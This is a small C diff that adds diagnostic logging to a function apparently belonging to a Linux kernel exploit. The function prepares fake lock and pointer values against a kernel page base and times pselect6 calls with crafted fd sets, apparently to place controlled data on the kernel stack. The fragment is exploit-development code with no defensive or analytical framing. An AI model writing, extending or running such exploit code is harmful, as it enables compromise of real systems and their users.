@@ -232,6 +232,9 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
 }
 
 void slide_pselect_stack_copy(void) {
+  diag_log("pselect_stack_copy: entry page=%016llx lock=%016llx w0=%016llx\n",
+           (unsigned long long)page_base, (unsigned long long)fake_lock,
+           (unsigned long long)fake_w0);
   if (!page_base || !fake_lock || !fake_w0) {
     pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
              page_base, fake_lock, fake_w0);
@@ -285,6 +288,8 @@ void slide_pselect_stack_copy(void) {
   };
   struct timespec *timeoutp = &timeout;
 
+  diag_log("pselect_stack_copy: fdsets ready, entering pselect nfds=%d\n",
+           slide_pselect_nfds);
   size_t pselect_started = gettime_ns();
   for (int index = 0; index < slide_syscall_pad; index++) {
     syscall(SYS_gettid);
@@ -294,6 +299,8 @@ void slide_pselect_stack_copy(void) {
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+  diag_log("pselect_stack_copy: pselect returned ret=%d errno=%d\n",
+           ret, saved_errno);
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
   atomic_store(&slide_consume_go, 0);
